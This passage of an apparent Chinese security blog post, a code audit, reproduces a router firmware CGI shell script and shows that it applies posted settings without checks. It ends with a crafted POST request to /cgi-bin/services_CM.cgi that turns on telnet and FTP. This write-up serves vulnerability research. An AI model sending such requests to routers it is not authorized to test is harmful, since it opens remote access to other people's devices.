class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$is_submit&quot; == &quot;1&quot; ]; then</span><br><span class="line">	[ &quot;$ACTION&quot; == &quot;ftp&quot; ] &amp;&amp; RETURNSTR=`$INTER_WEB set $CMIGD_DI_XCMCCSM_FtpEnable $FTPENABLE`</span><br><span class="line">	[ &quot;$ACTION&quot; == &quot;telnet&quot; ] &amp;&amp; RETURNSTR=`$INTER_WEB set $CMIGD_DI_XCMCCSM_TelnetEnable $TELNETENABLE`</span><br><span class="line">	[ &quot;$ACTION&quot; == &quot;dnsrelay&quot; ] &amp;&amp; RETURNSTR=`$INTER_WEB set $CMIGD_LAND_1_LANHCM_X_FIB_COM_DNSRelay $DNSRELAYENABLE`</span><br><span class="line">	#[ &quot;$ACTION&quot; == &quot;portalurl&quot; ] &amp;&amp; RETURNSTR=`$INTER_WEB set $CMIGD_DI_XCMCCPM_Enable $PORTALURL`</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;itms&quot; ]; then</span><br><span class="line">    	RETURNSTR=`$SETCFG $DEVFUNC_PATH ITMSEn $ITMSEN`</span><br><span class="line">		FactoryChange=1</span><br><span class="line">	fi</span><br><span class="line">	if [ &quot;$ITMSEN&quot; == &quot;1&quot; ]; then</span><br><span class="line">	    RETURNSTR=`killall onu_olt2`</span><br><span class="line">	elif [ &quot;$ITMSEN&quot; == &quot;0&quot; ]; then</span><br><span class="line">	    RETURNSTR=`/usr/sbin/onu_olt2 -F /var/ -M 2 -L 4 -S 3072 0&gt; /dev/zero 1&gt;&amp;0 2&gt;&amp;0 &amp;`</span><br><span class="line">	fi</span><br><span class="line"></span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;access&quot; ]; then</span><br><span class="line">		RETURNSTR=`$INTER_WEB set $CMIGD_S_XCMCCMWBAND_Mode $ACCESSC`</span><br><span class="line">	fi</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;linenumber&quot; ]; then</span><br><span class="line">		RETURNSTR=`$INTER_WEB set $CMIGD_S_XCMCCMWBAND_TotalTerminalNumber $ONLINENUMBER`</span><br><span class="line">	fi	</span><br><span class="line">	</span><br><span class="line">	[ &quot;$ACTION&quot; == &quot;staticlimit&quot; ] &amp;&amp; RETURNSTR=`$SETCFG $UDHCPD_LIMIT_CONF STATIC_LIMIT $STATICLIMIT`</span><br><span class="line">	[ &quot;$ACTION&quot; == &quot;checkonline&quot; ] &amp;&amp; RETURNSTR=`$SETCFG $UDHCPD_LIMIT_CONF CHECK_ONLINE $CHECKONLINE`</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;API&quot; ]; then</span><br><span class="line">		if [ &quot;$APIEnable&quot; == &quot;1&quot; ]; then</span><br><span class="line">			RETURNSTR=`rm -f /var/2544test`</span><br><span class="line">		elif [ &quot;$APIEnable&quot; == &quot;0&quot; ]; then</span><br><span class="line">			RETURNSTR=`touch /var/2544test`</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;Intelligent&quot; ]; then</span><br><span class="line">		if [ &quot;$IntelligentEnable&quot; == &quot;1&quot; ]; then	</span><br><span class="line">			RETURNSTR=`/rom/fhshell/misc_shell/jembench.sh 1 &gt;/dev/null 2&gt;&amp;1`</span><br><span class="line">			RETURNSTR=`touch /var/Intetest`	</span><br><span class="line">		elif [ &quot;$IntelligentEnable&quot; == &quot;0&quot; ]; then	</span><br><span class="line">			RETURNSTR=`/rom/fhshell/misc_shell/jembench.sh 0 &gt;/dev/null 2&gt;&amp;1`</span><br><span class="line">			RETURNSTR=`rm -f /var/Intetest`	</span><br><span class="line">		fi</span><br><span class="line">	fi	</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;Type&quot; ]; then</span><br><span class="line">		if [ &quot;$CPUTYPE&quot; == &quot;MTK7520S&quot; ] || [ &quot;$CPUTYPE&quot; == &quot;EN7526GT&quot; ]; then</span><br><span class="line">			if [ &quot;$DeviceType&quot; == &quot;HG6823M&quot; ] || [ &quot;$DeviceType&quot; == &quot;HG6821M&quot; ]; then</span><br><span class="line">				if [ ! -f /usr/protest/hg.conf ]; then</span><br><span class="line">					touch /usr/protest/hg.conf</span><br><span class="line">				fi</span><br><span class="line">				RETURNSTR=`$SETCFG /usr/protest/hg.conf CpuType $CPUTYPE`</span><br><span class="line">			fi</span><br><span class="line">		fi	</span><br><span class="line">	fi	</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;CONFIG&quot; ]; then</span><br><span class="line">		if [ &quot;$CONFIGEnable&quot; == &quot;0&quot; ]; then</span><br><span class="line">			RETURNSTR=`rm -f /usr/protest/omci_check_enable`</span><br><span class="line">		elif [ &quot;$CONFIGEnable&quot; == &quot;1&quot; ]; then</span><br><span class="line">			RETURNSTR=`touch /usr/protest/omci_check_enable`</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;CODE&quot; ]; then</span><br><span class="line">		if [ &quot;$CODEEnable&quot; == &quot;1&quot; ]; then</span><br><span class="line">			RETURNSTR=`rm -f /var/utf8flag`</span><br><span class="line">		elif [ &quot;$CODEEnable&quot; == &quot;0&quot; ]; then</span><br><span class="line">			RETURNSTR=`touch /var/utf8flag`</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;tcqos&quot; ]; then</span><br><span class="line">    	RETURNSTR=`$SETCFG $DEVFUNC_PATH TC_QOS $TCQOSENABLE`</span><br><span class="line">		FactoryChange=1</span><br><span class="line">	fi</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;Broadcast&quot; ]; then</span><br><span class="line">		if [ &quot;$BroadcastEnable&quot; == &quot;1&quot; ]; then</span><br><span class="line">			qdmamgr_lan set rxratelimit config enable packet &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">		else</span><br><span class="line">			qdmamgr_lan set rxratelimit config disable packet &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">		fi</span><br><span class="line">		RETURNSTR=`$SETCFG $&#123;BROANCONF&#125; broadcast $BroadcastEnable`</span><br><span class="line">	fi	</span><br><span class="line">	</span><br><span class="line">	if [ &quot;$ACTION&quot; == &quot;switch&quot; ]; then</span><br><span class="line">		RETURNSTR=`$INTER_WEB set $CMIGD_DI_X_FIB_COM_SpecialBcLimit $Broadcastswitch`</span><br><span class="line">	fi		</span><br><span class="line">	</span><br><span class="line">	[ &quot;$FactoryChange&quot; == &quot;1&quot; ] &amp;&amp; /usr/sbin/fh_sconfig backup factory &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">fi	</span><br><span class="line"></span><br><span class="line">echo &quot;</span><br><span class="line">&#123;\&quot;RETURN\&quot;:</span><br><span class="line">  &#123;\&quot;success\&quot;: true&#125;</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p>上面的是直接对参数进行操作，没有条件判断，执行完后，输出success.</p>
+<p>构造POST数据包,提交下面的参数就可以开启ftp,telnet了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/services_CM.cgi HTTP/1.1</span><br><span class="line">Referer: http://192.168.1.1/index_main_CM</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: application/json, text/javascript, */*</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">action=telnet&amp;telnetenable=1</span><br></pre></td></tr></table></figure>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/代码审计/">代码审计</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
